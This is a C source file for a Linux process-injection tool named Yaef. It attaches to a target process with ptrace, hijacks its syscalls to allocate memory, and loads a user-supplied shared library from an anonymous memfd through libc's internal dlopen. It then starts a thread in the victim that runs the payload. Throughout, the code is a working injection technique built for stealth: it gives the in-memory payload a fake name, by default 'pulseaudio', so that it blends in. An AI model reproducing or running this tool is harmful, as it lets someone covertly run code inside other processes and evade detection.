#include "Yaef.h"

#define SYS_MMAP                9
#define SYS_MEMFD_CREATE        319
#define MFD_CLOEXEC             1

#define RTLD_LAZY               0x00001

#define BUF_SIZE                200
#define INT30                   0xCC
#define TRACED                  1

#define MAX_STEPS               5

#define GREEN                   "\033[32m"
#define RESET                   "\033[0m"
#define RED                     "\033[31m"

static inline int memfd_create(const char *, unsigned int);
static pid_t * list_threads(const pid_t);
static bool aux_read(void *, const size_t, void *, const pid_t);
static bool aux_write(void *, const size_t, void *, const pid_t);
static uint64_t search_library(const char *,const pid_t);
static bool search_function(library_t *, const pid_t);
static bool search_dyn_segment(library_t *, const pid_t);
static Elf64_Shdr * elf_section_lookup(const char *, uint8_t *, const Elf64_Ehdr *);
static uint64_t hijack_syscall(process_t *, struct user_regs_struct *);
static uint64_t hijack_function(function_t *, pid_t);
static uint64_t inject_string(const char *, process_t *);
static bool flow_advance(process_t *);
static binary_t * scan_elf(int, const char *);
static void aux_exit(char *, process_t *, binary_t *);


/*
 * MEMFD_CREATE syscall wrapper. Used to create a memory based file.
 * @returns a file descriptor.
 */

int
memfd_create (const char *name, unsigned int flags)
{
    uint64_t ret;
    __asm__ volatile(
                    "mov	%1, %%rdi\n\t"
                    "mov	%2, %%rsi\n\t"
                    "mov	%0, %%rax\n\t"
                    "syscall"
                    ::"g"(SYS_MEMFD_CREATE), "g"(name), "g"(flags));

    asm("mov %%rax, %0" : "=r"(ret));
    return (int)ret;
}




/*
 * Get the threads tid of the target process.
 * @return a list of said threads.
 */

pid_t *
list_threads (const pid_t pid)
{
    char dirname[BUF_SIZE + 1]  = {0};
    DIR  *p_dir                 = NULL;
    pid_t *p_list               = NULL;

    snprintf(dirname, BUF_SIZE, "/proc/%d/task/", pid);

    if ((p_dir = opendir(dirname)) == NULL)
    {
        perror("[**] Error: Failed to open 'task' directory");
        return NULL;
    }

    struct dirent  *p_file  = NULL;
    pid_t   tid             = 0;
    uint64_t  max_size      = 0;
    uint8_t used            = 0;

    /* Obtain the maximum number
    of threads allowed by each process */
    max_size = (uint64_t)sysconf(_SC_THREAD_THREADS_MAX);
    max_size =  ((int64_t)max_size == -1)? BUF_SIZE : max_size;

    if ((p_list = calloc(max_size + 1, sizeof(pid_t))) == NULL) 
    {
        perror("[**] Errror: calloc(thread_list) - ");
        return NULL;
    }

    for (; used < max_size;)
    {
        if ((p_file = readdir(p_dir)) == NULL)
            break;

        sscanf(p_file->d_name, "%d%*c", &tid); //get thread id

        if (tid < 1)
            continue;

        p_list[used] = tid;
        used++;
    }

    closedir(p_dir);

    if (used == 0)
        return NULL;

    return p_list;
}




/*
 * PTRACE_ATTACH wrapper. Attach to all available threads.
 * The reason behind this is so we can stop them an avoid
 * future race conditions while setting breakpoints.
 */

bool
attach_to_process (process_t *victim)
{
    pid_t *p_list = NULL;

    if ((p_list = list_threads(victim->pid)) == NULL)
    {
        fprintf(stderr, "[**] Error: Failed to stop process threads\n");
        return false;
    }

    for (int i = 0; p_list[i]; i++)
    {
#ifdef DEBUG
        printf(GREEN "[*]");
        printf(RESET "Thread %d stopped\n", p_list[i]);
#endif
        if (ptrace(PTRACE_ATTACH, p_list[i], NULL, NULL) < 0)
        {
            fprintf(stderr, "[**] Error: PTRACE_ATTACH thread %d: %s\n",
                    p_list[i], strerror(errno));

            //Some threads may be dead by now.
            //The one which matters is the main thread.
            if (p_list[i] != victim->pid)
                continue;
            else
                return false;
        }

        wait(NULL);
    }

    victim->traced = TRACED;
    free(p_list);

    printf(GREEN "[*]");
    printf(RESET "Attached!\n");

    return true;
}




/*
 * process_vm_readv() wrapper. More convenient than Ptrace
 * to read big chuncks of remote process's memory.
 */

bool
aux_read (void *p_local, const size_t size, void *p_remote, const pid_t pid)
{
    struct iovec local =
    {
        .iov_base = p_local,
        .iov_len = size
    };

    struct iovec remote =
    {
        .iov_base = p_remote,
        .iov_len = size
    };

    if ((size_t)process_vm_readv(pid, &local, 1, &remote, 1, 0) != size)
    {
        perror("READ MEMORY");
        return false;
    }

    return true;
}




/*
 * process_vm_writev() wrapper. More convenient than ptrace
 * to write big chunks of data into the remote process's memory.
 */

bool
aux_write (void *p_local, const size_t size, void *p_remote, const pid_t pid)
{
    struct iovec local =
    {
        .iov_base = p_local,
        .iov_len = size
    };

    struct iovec remote =
    {
        .iov_base = p_remote,
        .iov_len = size
    };

    if ((size_t)process_vm_writev(pid, &local, 1, &remote, 1, 0) != size)
    {
        perror("WRITE MEMORY");
        return false;
    }

    return true;
}




/*
 * Search for the library's @str_lib mapped address.
 * In order to do so, parse the remote process's maps file.
 */

uint64_t
search_library (const char *str_lib, const pid_t pid)
{
    char maps [BUF_SIZE + 1]	= {0};
    uint64_t p_lib           	=  0;
    FILE *fp                    = NULL;

    snprintf(maps, BUF_SIZE, "/proc/%d/maps", pid); //remote process's memory mapping
    if ((fp = fopen(maps, "r")) == NULL)
    {
        fprintf(stderr, "[**] Cant open %s: %s\n", maps,
                strerror(errno));
        return 0;
    }

    while (fgets(maps, BUF_SIZE, fp))
    {
        if (strstr(maps, str_lib))
        {
            sscanf( maps, "%p-*", (void**) &p_lib); //get library address
            goto exit;
        }
    }

    fprintf(stderr, "[**] Error: Unknown library %s\n", str_lib);

exit:
    fclose(fp);
    return p_lib;
}




/*
 * Find the addresses of the dynstr and
 * dynsym sections (whithin the dynamic section),
 * so we can search for the function symbol and thus get its offset.
 */
bool
search_function (library_t *p_lib, const pid_t pid)
{

    Elf64_Dyn *p_dynamic            = NULL;
    Elf64_Dyn dyn               	= {0};
    char string [BUF_SIZE + 1]      = {0};

    p_dynamic = p_lib->dynamic_segmt;

    //Search for both sections until the end is reached
    do
    {
        if (aux_read(&dyn, sizeof(Elf64_Dyn), p_dynamic, pid) == false)
        {
            goto error;
        }

        if (dyn.d_tag == DT_STRTAB)
        {
            p_lib->strtab = (char *)dyn.d_un.d_ptr;
        }

        if (dyn.d_tag == DT_SYMTAB)
        {
            p_lib->symtab = (Elf64_Sym *)dyn.d_un.d_ptr;
        }

        p_dynamic++;

    } while (dyn.d_tag != DT_NULL);

    Elf64_Sym *p_symtab = p_lib->symtab;
    Elf64_Sym symbols   = {0};

    //Search for the function name
    while (strncmp(p_lib->func->func_name, string, BUF_SIZE))
    {
        if (aux_read(&symbols, sizeof(Elf64_Sym), p_symtab, pid) == false)
        {
            goto error;
        }

        if (aux_read(&string, BUF_SIZE,
                    (void*)(p_lib->strtab + symbols.st_name), pid) == false)

        {
            goto error;
        }

        p_symtab++;
    }


    p_lib->func->func_addr = symbols.st_value + p_lib->lib_addr;

    printf(GREEN "[*]");
    printf(RESET "%p <- %s()\n",(void *)p_lib->func->func_addr,
                                        p_lib->func->func_name);

    return true;

    error:
        fprintf(stderr, "[**] Error: Function not found\n");
        return false;
}




/*
 * Search for the library @p_lib dynamic segment.
 * @return address of said segment.
 */

bool
search_dyn_segment (library_t *p_lib, const pid_t pid)
{
    size_t segments         = 0;
    Elf64_Phdr *p_segmt     = NULL;
    Elf64_Phdr dynheader    = {0};
    Elf64_Ehdr bin          = {0};

    if (aux_read(&bin, sizeof(Elf64_Ehdr), (void*)p_lib->lib_addr, pid) == false)
    {
        return false;
    }

    p_segmt = (Elf64_Phdr *) (p_lib->lib_addr + bin.e_phoff);
    segments = bin.e_phnum; //segments' entries number

    //lookup the dynamic segment entry on the segment table
    for (uint32_t i = 0; i < segments; i++, p_segmt++)
    {
        if (aux_read(&dynheader, sizeof(Elf64_Phdr), p_segmt, pid) == false)
        {
            break;
        }

        if (dynheader.p_type == PT_DYNAMIC) //type dynamic
        {
            p_lib->dynamic_segmt = (Elf64_Dyn*)(dynheader.p_vaddr + p_lib->lib_addr);
            return true;
        }
    }

    fprintf(stderr, "[**] Error: PT_DYNAMIC segment not found\n");
    return false;
}




/*
 * As the name implies: search for the specified section @str_section
 * in the Elf file.
 * @return a pointer to the section.
 */

Elf64_Shdr *
elf_section_lookup (const char *str_section,
        uint8_t *p_mem, const Elf64_Ehdr *p_ehdr)
{
    Elf64_Shdr *p_shdr      = (Elf64_Shdr *) (p_mem + p_ehdr->e_shoff);
    void *p_strtable        = p_mem + p_shdr[p_ehdr->e_shstrndx].sh_offset;
    char *str_name          = NULL;

    //Search for sections' name in the strings table
    for (uint8_t i = 0; i < p_ehdr->e_shnum; i++)
    {
        str_name = (char *) p_strtable + p_shdr[i].sh_name;
        if (strstr(str_name, str_section))
        {
            return &p_shdr[i];
        }
    }

    return NULL;
}




/*
 * Take control of a valid syscall and implement our own one.
 * Lastly, redo the original one.
 * @return value of the syscall.
 */

uint64_t
hijack_syscall (process_t *victim, struct user_regs_struct *p_params)
{

    int status = 0;
    struct user_regs_struct oldregs = {0};

    for (uint8_t i = 0; i < 2; i++)
    {
        //Make a syscall or come from one.
        if (ptrace(PTRACE_SYSCALL, victim->pid, NULL, NULL) < 0)
        {
            perror("[**] Error: hijack_syscall()");
            return 0;
        }

        waitpid(victim->pid, &status, 0);

        if (WIFEXITED(status))
        {
            fprintf(stderr, "[**] Error: victim exited\n");
            return 0;
        }

        if (WIFSIGNALED(status))
        {
            fprintf(stderr, "[**] Error: victim signaled\n");
            return 0;
        }

        //Get the args of the syscall
        if (ptrace(PTRACE_GETREGS, victim->pid, NULL, &oldregs) < 0)
        {
            perror("[**] Error: hijack_syscall()");
            return 0;
        }


        if (i == 1) //redo the original syscall and continue execution
        {
            victim->syscall.rax = victim->syscall.orig_rax;
            victim->syscall.orig_rax = 0;
            victim->syscall.rip -= 2;
        }

        if (i == 0) //redo the syscall with our own args
        {
            victim->syscall = oldregs;
            victim->syscall.rcx -= 2;
            victim->syscall.orig_rax = p_params->orig_rax;
            victim->syscall.rdi = p_params->rdi;
            victim->syscall.rsi = p_params->rsi;
            victim->syscall.rdx = p_params->rdx;
            victim->syscall.r10 = p_params->r10;
            victim->syscall.r8  = p_params->r8;
            victim->syscall.r9  = p_params->r9;
        }

        if (ptrace(PTRACE_SETREGS, victim->pid, NULL,
                    &victim->syscall) < 0)
        {
            perror("[**] Error: hijack_syscall()");
            return 0;
        }

        victim->syscall = oldregs;
    }

    return victim->syscall.rax;
}




/*
 * Modify the value of the process's registers, with the help of
 * the Ptrace API, in order to alter the flow of the target program.
 * @return value of the hijacked function.
 */

uint64_t
hijack_function (function_t *new, pid_t pid)
{
    struct user_regs_struct oldregs = {0};
    struct user_regs_struct temp    = {0};

    if (ptrace(PTRACE_GETREGS, pid, NULL, &oldregs) < 0)
    {
        perror("[**] Error: hijack_function(): get registers");
        return 1;
    }

    temp = new->params;
    new->params = oldregs;

    new->params.rip = temp.rip;
    new->params.rdi = temp.rdi;
    new->params.rsi = temp.rsi;
    new->params.rdx = temp.rdx;
    new->params.rcx = temp.rcx;
    new->params.r10 = temp.r10;
    new->params.r8  = temp.r8;
    new->params.r9  = temp.r9;
    new->params.rsp = oldregs.rsp - 0x8; //decrease stack pointer

    uint64_t savedrip;
    int  status;

    //Get next instruction´s opcodes.
    if ((int64_t)(savedrip = (uint64_t)ptrace(PTRACE_PEEKTEXT, pid, oldregs.rip, NULL)) == -1)
    {
        perror("[**] Error: hijack_function(): get instruction's opcodes");
        return 1;
    }

    //Save next instruction's pointer in the stack as a return address.
    if ((ptrace(PTRACE_POKETEXT, pid, new->params.rsp, oldregs.rip)) < 0)
    {
        perror("[**] Error: hijack_function(): set return address");
        return 1;
    }


    //Set a breakpoint at the next instruction.
    uint64_t breakpoint = (savedrip & (uint64_t)~0xFF) | INT30;

    if ((ptrace(PTRACE_POKETEXT, pid, oldregs.rip, (void*) breakpoint)) < 0)
    {
        perror("[**] Error: hijack_function(): set breakpoint");
        return 1;
    }

    //Set modified registers.
    if (ptrace(PTRACE_SETREGS, pid, NULL, &new->params) < 0)
    {
        perror("[**] Error: hijack_function(): update registers value");
        return 1;
    }

    //Jump to function() and return to the breakpoint.
    if (ptrace(PTRACE_CONT, pid, NULL, NULL) < 0)
    {
        perror("[**] Error: hijack_function(): continue");
        return 1;
    }

    wait(&status); //It may fail in a multithread process

    if (WIFSTOPPED(status) == false)
    {
        fprintf(stderr, "[**] Error: hijack_function(): victim exited\n");
        return 1;
    }


    //Get new registers.
    if (ptrace(PTRACE_GETREGS, pid, NULL, &new->params) < 0)
    {
        perror("[**] Error: hijack_function(): get registers");
        return 1;
    }

    //Restore registers.
    if (ptrace(PTRACE_SETREGS, pid, NULL, &oldregs) < 0)
    {
        perror("[**] Error: hijack_function(): restore registers");
        return 1;
    }

    //Remove breakpoint.
    if ((ptrace(PTRACE_POKETEXT, pid, oldregs.rip, (void*)savedrip)) < 0)
    {
        perror("[**] Error: hijack_function(): remove breakpoint");
        return 1;
    }


    return new->params.rax;
}




/*
 * Allocate memory in the remote process and write a string into it.
 * @return the address.
 */

uint64_t
inject_string (const char *str_path, process_t *victim)
{
    uint64_t p_string = 0;

    struct user_regs_struct params =
    {
        .rdi = 0,
        .rsi = strlen(str_path),
        .rdx = PROT_WRITE | PROT_READ,
        .r10 = MAP_PRIVATE | MAP_ANONYMOUS,
        .r8 =  (uint64_t) -1,
        .r9 =  0,
        .orig_rax = SYS_MMAP,
    };

    //mmap()
    if ((p_string = hijack_syscall(victim, &params)) == 0)
    {
        fprintf(stderr, "[**] Error: syscall %d\n", SYS_MMAP);
        return 0;
    }

    //Write the path into the remote process's newly allocated memory.
    if (aux_write((void *)str_path, strlen(str_path),
                (void *)p_string, victim->pid) == false)
    {
        fprintf(stderr, "[**] Error: string cannot be injected\n");
        return 0;
    }

    printf(GREEN "[*]");
    printf(RESET "%p <- String Injected!\n", (void*)p_string);

    return p_string;
}




/*
 * Single-step a few instructions so that we don't
 * have to work with the same ones over and over again.
 */

bool
flow_advance (process_t *victim)
{
    int status  = 0;

    for (uint8_t i = 0; i < MAX_STEPS; i++)
    {
        if (ptrace(PTRACE_SINGLESTEP, victim->pid, NULL, NULL) < 0)
        {
            perror("[**] Error: flow_advance(): single-step");
            return false;
        }

        wait(&status);

        if (WIFSTOPPED(status) == false)
        {
            fprintf(stderr, "[**] Error: flow_advance(): victim exited\n");
            return false;
        }

    }

    return true;
}




/*
 * Upload the specified file @str_bname into our memory, so we can
 * later pass it to dlopen() in a more stealthy way.
 */

binary_t *
load_payload (const char * str_path, const char *str_fname, const char *str_bname)
{

    int fd = 0;

    if ((fd = open(str_path, O_RDONLY, 0)) < 0)
    {
        fprintf(stderr, "[**] Error: Cannot open %s: %s\n",
                str_path, strerror(errno));
        return NULL;
    }

    binary_t *p_bin = NULL;
    char *buff      = NULL;
    ssize_t size    = BUF_SIZE;

    if ((p_bin = scan_elf(fd, (char*)str_fname)) == NULL)
    {
        fprintf(stderr, "[**] Error: scan_elf(%s): Invalid Elf\n", str_path);
        return NULL;
    }

    p_bin->path = (char *)str_path;
    p_bin->name = (char *)str_bname;

    printf(GREEN "[*]");
    printf(RESET "Valid ELF binary\n");

    //Create an anonymous memory file
    if ((p_bin->memfd = memfd_create(str_bname, MFD_CLOEXEC)) < 0)
    {
        fprintf(stderr, "[**] Error: Failed to create memory-file: %d\n",
                p_bin->memfd);
        return NULL;
    }

    if ((buff = calloc(1, sizeof(char) * (BUF_SIZE + 1))) == NULL)
    {
        perror("[**] Error: Failed to allocate memory");
        return NULL;
    }

    //Copy the original elf file's data into the newly allocated memory
    while (size)
    {
        if ((size = read(fd, buff, BUF_SIZE)) < 0)
        {
            fprintf(stderr, "[**] Error: cannot read payload: %s\n",
                    strerror(errno));
            return NULL;
        }

        if (write(p_bin->memfd, buff, (size_t)size) < 0)
        {
            fprintf(stderr, "[**] Error: cannot write to file: %s\n", strerror(errno));
            return NULL;
        }
    }

    lseek(p_bin->memfd, 0, SEEK_SET);
    free(buff);
    close(fd);

    return p_bin;
}




/*
 * Parse and validate the elf file @fd and obtain
 * the specified function's @function offset.
 * @return and object with all said file information.
 */

binary_t *
scan_elf (int fd, const char *function)
{
    struct stat st          = {0};
    binary_t *p_bin         = NULL;
    Elf64_Ehdr *p_ehdr      = NULL;
    Elf64_Shdr *p_strtab    = NULL;
    Elf64_Shdr *p_symtab    = NULL;
    char *p_string          = NULL;
    Elf64_Sym *p_sym        = NULL;
    char *str_name          = NULL;

    if ((p_bin = calloc(1, sizeof(binary_t))) == NULL)
    {
        perror("[**] Error: Failed to allocate memory");
        return NULL;
    }

    if (fstat(fd, &st) < 0)
    {
        perror("[**] Error: Failed to stat file");
        return NULL;
    }

    p_bin->size = (size_t) st.st_size; //Get file's size.

    //Map the executable into memory.
    p_bin->mem = mmap(NULL, p_bin->size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (p_bin->mem == MAP_FAILED)
    {
        perror("[**] Error: Failed to mmap file");
        return NULL;
    }

    p_ehdr = (Elf64_Ehdr *) p_bin->mem;  //Check the elf header.
    if ( p_ehdr->e_ident[EI_MAG0] != 0x7f
                && strncmp((char *)&p_ehdr->e_ident[EI_MAG1], "ELF", 3))
    {
        fprintf(stderr, "[**] Error: Invalid ELF file\n");
        return NULL;
    }

    if (p_ehdr->e_type != ET_DYN) //Check if it's a shared lib.
    {
        fprintf(stderr, "[**] Error: Elf is not a valid shared object\n");
        return NULL;
    }

    if ((p_strtab = elf_section_lookup("strtab", p_bin->mem, p_ehdr)) == NULL)
    {
        fprintf(stderr, "[**] Error: Strtab section not found\n");
        return NULL;
    }

    if ((p_symtab = elf_section_lookup("symtab", p_bin->mem, p_ehdr)) == NULL)
    {
        fprintf(stderr, "[**] Error: Symtab section not found\n");
        return NULL;
    }

    //symtab & strtab sections' pointers
    p_sym = (Elf64_Sym *) (p_symtab->sh_offset + p_bin->mem);
    p_string = (char *)(p_strtab->sh_offset + p_bin->mem);

    //Let's check if the function really exists.
    for (uint8_t j = 0; j < p_symtab->sh_size / sizeof(Elf64_Sym); j++)
    {
        str_name = (char *) (p_string + p_sym[j].st_name); //Symbol's name
        if (strcmp(str_name, function) == 0)
        {
            p_bin->function = str_name;
            p_bin->offset   = p_sym[j].st_value;
            printf(GREEN "[*]");
            printf(RESET "0x%012lx <- %s() offset\n", p_bin->offset, p_bin->function);
            return p_bin;
        }
    }

    fprintf(stderr, "[**] Error: Function %s not found\n", function);
    return NULL;
}




/*
 * Search in the target's process for the library @str_name
 * and find the location of the specified function.
 * @return pointer to said library and respective function.
 */

library_t *
scan_library (const char *str_lname, const char *str_fname, const pid_t pid)
{
    library_t *p_lib = NULL;

    if ((p_lib = calloc(1, sizeof(library_t))) == NULL)
    {
        perror("[**] Error: Failed to allocate memory");
        return NULL;
    }

    p_lib->lib_name = (char *)str_lname;

    if ((p_lib->lib_addr = search_library(p_lib->lib_name, pid)) == 0)
    {
        fprintf(stderr, "[**] Error: search_library(%s) Failed\n", str_lname);
        return NULL;
    }

    if (search_dyn_segment(p_lib, pid) == false)
    {
        fprintf(stderr, "[**] Error:  search_dyn_segment(%s) Failed\n",
                str_lname);
        return NULL;
    }

    if ((p_lib->func = calloc(1, sizeof(function_t))) == NULL)
    {
        perror("[**] Error: Failed to allocate memory");
        return NULL;
    }

    p_lib->func->func_name = (char *)str_fname;

    if (search_function(p_lib, pid) == false)
    {
        fprintf(stderr, "[**] Error: %s search_function(%s) Failed\n",
                str_lname, str_fname);
        return NULL;
    }

    return p_lib;
}




/*
 * Handle errors, exit gracefully and/or show debug information.
 */

static void
aux_exit (char * str_msg, process_t *victim, binary_t *p_bin)
{
    if (victim != NULL)
    {
        if (str_msg != NULL)
        {
            fprintf(stderr, "[**] Error: %s\n", str_msg);
        }
    }
    else
    {
        printf(GREEN "\n%s\n", str_msg);
        printf(RESET "");
        exit(EXIT_SUCCESS);
    }

#ifdef DEBUG
    //Syscall debugging
    printf(RED "\n\t##### DEBUG #####\n\n");
    printf( RESET
            "PID 	    -> %d\n"
            "TRACED      -> %d\n"
            "$RIP 	    -> %p\n"
            "$RSP 	    -> %p\n"
            "$RDI	    -> %p\n"
            "$RSI	    -> %p\n"
            "$RDX	    -> %p\n"
            "$ORIG_RAX   -> %p\n"
            "$RCX 	    -> %p\n"
            "$RAX 	    -> %p\n\n",
            victim->pid, victim->traced,
            (void*)victim->syscall.rip, (void*)victim->syscall.rsp,
            (void*)victim->syscall.rdi, (void*)victim->syscall.rsi,
            (void*)victim->syscall.rdx, (void*)victim->syscall.orig_rax,
            (void*)victim->syscall.rcx, (void*)victim->syscall.rax);
#endif

    for (int i = 0; victim->lib[i]; i++)
    {
#ifdef DEBUG
        //library debugging
        printf(RED " LIBRARY %d:\n\n", i);
        printf( RESET 
                "Regex Name 		-> %s\n"
                "Base Address 		-> %p\n"
                "Dynamic segment 	-> %p\n"
                "DYNSYM  section  	-> %p\n"
                "DYNSTR  section		-> %p\n\n",
                victim->lib[i]->lib_name,
                (void*)victim->lib[i]->lib_addr,
                (void*)victim->lib[i]->dynamic_segmt,
                (void*)victim->lib[i]->symtab,
                (void*)victim->lib[i]->strtab);
#endif
        if (!victim->lib[i]->func)
        {
            continue;
        }

#ifdef DEBUG
        //function debugging
        printf("Function    -> %s\n"
                "Address     -> %p\n",
                victim->lib[i]->func->func_name,
                (void*)victim->lib[i]->func->func_addr);

        struct user_regs_struct params = victim->lib[i]->func->params;
        printf(RED "-------------------\n\n");

        printf( RESET
                "$RIP 	    -> %p\n"
                "$RSP 	    -> %p\n"
                "$RDI	    -> %p\n"
                "$RSI	    -> %p\n"
                "$RDX	    -> %p\n"
                "$ORIG_RAX   -> %p\n"
                "$RCX 	    -> %p\n"
                "$RAX 	    -> %p\n\n",
                (void*)params.rip, (void*)params.rsp,
                (void*)params.rdi, (void*)params.rsi,
                (void*)params.rdx, (void*)params.orig_rax,
                (void*)params.rcx, (void*)params.rax);
#endif
        free(victim->lib[i]->func);
    }

    if (p_bin)
    {
#ifdef DEBUG
        //Elf Binary debugging
        printf(RED " ELF Binary\n\n");
        printf( RESET
                "Path      -> %s\n"
                "FD        -> %d\n"
                "Size      -> %ldb\n"
                "Function  -> %s\n"
                "Fake Name -> %s\n"
                "Offset    -> 0x%012lx\n",
                p_bin->path, p_bin->memfd, p_bin->size,
                p_bin->function, p_bin->name, p_bin->offset);
#endif
        free(p_bin);
    }

    exit(EXIT_FAILURE);
}




/*
 * Hijack the pthread_create() of the target's process and
 * create a remote thread with the specified function as entrypoint.
 */

void
__create_thread (process_t *victim, binary_t *p_bin)
{
    uint64_t p_thread = 0;

    //Let's allocate some space for one of pthread_create() arguments.
    struct user_regs_struct params =
    {
            .rdi = 0,
            .rsi = sizeof(pthread_t),
            .rdx = PROT_WRITE | PROT_READ,
            .r10 = MAP_PRIVATE | MAP_ANONYMOUS,
            .r8 =  0,
            .orig_rax = SYS_MMAP,
    };

    //mmap(...)
    if ((p_thread = hijack_syscall(victim, &params)) == 0)
    {
        aux_exit("Pthread hijack_syscall() Failed", victim, p_bin);
    }

    if (flow_advance(victim) == false)
    {
        aux_exit("Pthread flow_advance() Failed", victim, p_bin);
    }

    if ((victim->lib[EVIL]->func = calloc(1, sizeof(function_t))) == NULL)
    {
        aux_exit("[**] Error: Failed to allocate memory", victim, p_bin);
    }

    victim->lib[EVIL]->func->func_name = p_bin->function;

    //library base address + function offset = real function's address
    victim->lib[EVIL]->func->func_addr = victim->lib[EVIL]->lib_addr + p_bin->offset;

    //pthread_create(pthread_t *thread, , void *(*start_routine) (void *), );
    victim->lib[PTHREAD]->func->params.rip = victim->lib[PTHREAD]->func->func_addr;
    victim->lib[PTHREAD]->func->params.rdi = p_thread;
    victim->lib[PTHREAD]->func->params.rsi = 0;
    victim->lib[PTHREAD]->func->params.rdx = victim->lib[EVIL]->func->func_addr;
    victim->lib[PTHREAD]->func->params.rcx = 0;

    if (hijack_function(victim->lib[PTHREAD]->func, victim->pid) != 0)
    {
        aux_exit("Pthread hijack_function(evil) Failed", victim, p_bin);
    }
}




/*
 * Hijack the libc dlopen() of the target's process and load
 * the specified library @str_lib. On success, the mapped
 * binary's address is obtained.
 */

bool
__dl_open (process_t * victim, const char *str_lib,
        const int type, const char *str_bname)
{
    uint64_t p_string = 0;

    if ((victim->lib[type] = calloc(1, sizeof(library_t))) == NULL)
    {
        perror("[**] Error: Failed to allocate memory");
        return false;
    }

    victim->lib[type]->lib_name = (char *)str_lib;

    if ((p_string = inject_string(victim->lib[type]->lib_name, victim)) == 0)
    {
        fprintf(stderr, "[**] Error: Libc inject_string(%s) Failed\n", str_lib);
        return false;
    }

    if (flow_advance(victim) == false)
    {
        fprintf(stderr, "[**] Error: Libc flow_advance(%s) Failed\n", str_lib);
        return false;
    }

    //dlopen(const char *filename, int flag)
    victim->lib[GLIBC]->func->params.rip = victim->lib[GLIBC]->func->func_addr;
    victim->lib[GLIBC]->func->params.rdi = p_string;
    victim->lib[GLIBC]->func->params.rsi = RTLD_LAZY;

    if (hijack_function(victim->lib[GLIBC]->func, victim->pid) <= 1)
    {
        fprintf(stderr, "[**] Error: Libc dlopen(%s) Failed\n", str_lib);
        return false;
    }

    /* dlopen() returns an 'opaque handle', which is hard to deal with,
    so let's use the good old method: read maps file. */

    if ((victim->lib[type]->lib_addr = search_library(str_bname, victim->pid)) == 0)
    {
        fprintf(stderr, "[**] Error: search_library(%s) Failed\n", str_lib);
        return NULL;
    }

    printf(GREEN "[*]");

    printf(RESET "%p <- '%s' Injected!\n",
            (void *) victim->lib[type]->lib_addr, str_bname);

    return true;
}




void
usage (void)
{
    puts("Usage: ./Yaef <option> <value>...\n");
    puts("\t-p\tTarget process id\n"
        "\t-b\tElf binary path\n"
        "\t-f\tElf binary function's name\n"
        "\t-n\tFile fake name (optional)\n");

    exit(EXIT_FAILURE);
}




int
main (int argc, char ** argv)
{
    printf(GREEN "\n\t#### YAEF ####\n");
    printf(RESET "\n");

    if (argc < 7)
    {
        usage();
    }

    int c               = 0;
    binary_t *p_bin     = NULL;
    process_t victim    = {0};
    char *str_path      = NULL;
    char *str_fname     = NULL;
    char *str_bname     = NULL;

    /* parse argv */
    while ((c = getopt(argc, argv, "p:b:f:n:")) != -1)
    {
        switch(c)
        {
            case 'p':
                victim.pid = atoi(optarg);
                break;
            case 'b':
                str_path = optarg;
                break;
            case 'f':
                str_fname = optarg;
                break;
            case 'n':
                str_bname = optarg;
                break;
            default:
                usage();
        }
    }

    if (str_bname == NULL)
    {
        str_bname = "pulseaudio"; //pretty common
    }

    if (victim.pid <= 0 || str_path == NULL || str_fname == NULL)
    {
        usage();
    }

    char path[PATH_MAX + 1] = {0};

    victim.lib[GLIBC] = scan_library("libc-", "__libc_dlopen_mode", victim.pid);
    if (victim.lib[GLIBC] == NULL)
    {
        aux_exit(NULL, &victim, NULL);
    }

    //------- Binary Injection --------
    if ((p_bin = load_payload(str_path, str_fname, str_bname)) == NULL)
    {
        aux_exit("load_payload() Failed", &victim, NULL);
    }

    if (attach_to_process(&victim) == false)
    {
        aux_exit("Attach_to_process() Failed", &victim, p_bin);
    }

    sprintf(path, "/proc/%d/fd/%d", getpid(), p_bin->memfd);

    if (__dl_open(&victim, path, EVIL, p_bin->name) == false)
    {
        fprintf(stderr, "[**] Error: __dl_open(%s) Failed\n", path);
        aux_exit(NULL, &victim, p_bin);
    }

    // ------ Thread Injection and hijacking ------
    victim.lib[PTHREAD] = scan_library("libpthread", "pthread_create", victim.pid);
    if (victim.lib[PTHREAD] == NULL)
    {
        //In case the target program doesn't have libpthread.so loaded,
        //let's try and do it manually.
        if (__dl_open(&victim, "libpthread.so.0", PTHREAD, "libpthread") == false)
        {
            fprintf(stderr, "[**] Error: __dl_open(libpthread.so.0) Failed\n");
            aux_exit(NULL, &victim, p_bin);
        }

        victim.lib[PTHREAD] = scan_library("libpthread", "pthread_create", victim.pid);
        if (victim.lib[PTHREAD] == NULL)
        {
            aux_exit(NULL, &victim, p_bin);
        }
    }

    __create_thread(&victim, p_bin);

    aux_exit("\t*** OK ***\n", NULL, NULL);
}
